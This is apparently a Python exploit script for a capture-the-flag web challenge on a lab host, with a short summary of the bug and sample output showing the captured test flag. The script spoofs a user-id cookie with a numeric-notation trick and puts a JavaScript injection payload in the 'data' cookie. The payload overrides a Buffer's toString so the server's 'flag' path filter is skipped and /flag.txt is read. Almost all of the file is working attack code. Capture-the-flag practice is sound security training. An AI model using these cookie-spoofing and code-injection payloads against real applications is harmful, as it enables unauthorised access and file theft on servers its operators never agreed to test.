#!/usr/bin/env python3

'''
# Summary
readFile: (path) => {
    if(!(new String(path).toString()).includes('flag'))
        return fs.readFileSync(path,{encoding: "utf-8"})
    return null
}
- We can change toString arbitrarily to bypass the flag filter
- fs.readFileSync also receive the Buffer()
'''

import requests

HOST = "10.13.37.220"
PORT = "8000"
USERNAME = 'test'
PASSWORD = 'test'

proxies = {
    "http":'127.0.0.1:8081',
    "https":'127.0.0.1:8081'
}

def main():
    s = requests.Session()

    print("Logging in...")
    login_response = login(s, USERNAME, PASSWORD)

    if login_response["error"]:
        print(login_response["msg"])

        print("Registering...")
        register_response = register(s, USERNAME, PASSWORD)

        if register_response["error"]:
            print(register_response["msg"])
            return

    uid = s.cookies["uid"]
    passwd = s.cookies["passwd"]
    print(f"uid is {uid}")
    print(f"passwd is {passwd}")

    spoofed_uid = f"0.{uid}e{len(str(uid))}"
    print(f"Spoofing uid as {spoofed_uid}")

    del s.cookies["uid"]
    s.cookies["uid"] = spoofed_uid
    s.cookies["data"] = "1])%3Ba=new%20Buffer('/flag.txt')%3Ba.toString=function(){return null}%3BreadFile(a)//"
    flag = checkout(s)
    print("flag : "+flag.replace("\"",""))


def register(s, username, password):
    response = s.post(f"http://{HOST}:{PORT}/register", json={"username": username, "password": password}, proxies=proxies)
    return response.json()


def login(s, username, password):
    response = s.post(f"http://{HOST}:{PORT}/login", json={"username": username, "password": password}, proxies=proxies)
    return response.json()

def checkout(s):
    try:
        response = s.get(f"http://{HOST}:{PORT}/checkout", proxies=proxies)
        return response.text
    except Exception as e:
        print(e)


if __name__ == "__main__":
    main()

'''
Logging in...
uid is 1
passwd is 9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08
Spoofing uid as 0.1e1
flag : hspace{testflag}
'''